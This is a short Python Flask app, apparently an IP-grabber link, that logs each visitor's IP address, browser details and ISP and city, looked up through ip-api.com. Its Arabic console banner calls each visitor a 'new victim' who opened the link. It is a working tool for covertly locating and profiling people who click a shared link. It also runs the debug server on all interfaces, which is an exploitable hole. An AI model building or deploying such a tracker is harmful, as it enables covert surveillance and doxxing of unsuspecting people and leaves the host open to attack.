from flask import Flask, render_template, request
import urllib.request
import json

app = Flask(__name__)

@app.route('/')
def home():
    if request.headers.get('X-Forwarded-For'):
        visitor_ip = request.headers.get('X-Forwarded-For').split(',')[0]
    else:
        visitor_ip = request.remote_addr

    device_info = request.headers.get('User-Agent')

    isp_name = "غير معلوم (جهاز محلي)"
    country = "محلي"
    city = "محلي"

    if visitor_ip != "127.0.0.1" and visitor_ip != "::1":
        try:
            url = f"http://ip-api.com/json/{visitor_ip}?fields=status,country,city,isp,org,query"
            response = urllib.request.urlopen(url)
            data = json.loads(response.read().decode('utf-8'))
            
            if data['status'] == 'success':
                isp_name = data.get('isp', 'غير معروف')
                country = data.get('country', 'غير معروف')
                city = data.get('city', 'غير معروف')
        except:
            pass

    print("\n" + "="*60)
    print(f"[🚨] ضحية جديدة دخلت الرابط وحاولت تفتح الصفحة!")
    print(f"🌍 IP الزائر: {visitor_ip}")
    print(f"🏢 اسم الشبكة/مزود الإنترنت: {isp_name}")
    print(f"📍 الدولة والمدينة: {country} - {city}")
    print(f"📱 تفاصيل الجهاز: {device_info}")
    print("="*60 + "\n")

    return render_template('index.html')

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)